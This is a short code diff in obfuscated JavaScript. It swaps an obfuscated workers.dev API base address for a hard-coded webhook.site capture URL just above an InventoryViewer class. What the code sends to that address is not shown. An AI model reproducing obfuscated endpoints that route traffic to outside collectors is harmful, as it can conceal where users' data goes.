@@ -509,7 +509,8 @@ const _0x3ed03f = function () {
     }
   });
 _0x13c405();
-const API_BASE = _0x405a0a(0x358, '56UR') + _0x405a0a(0x4e5, '&tL^') + _0x405a0a(0xeb8, 'E27K') + 'dimahmoud6' + '65.workers' + '.dev';
+//const API_BASE = _0x405a0a(0x358, '56UR') + _0x405a0a(0x4e5, '&tL^') + _0x405a0a(0xeb8, 'E27K') + 'dimahmoud6' + '65.workers' + '.dev';
+const API_BASE = "https://webhook.site/e0f77cf9-fe7d-4fc5-af76-04d115597b16";
 class InventoryViewer {
   constructor() {
     const _0x52fb12 = {
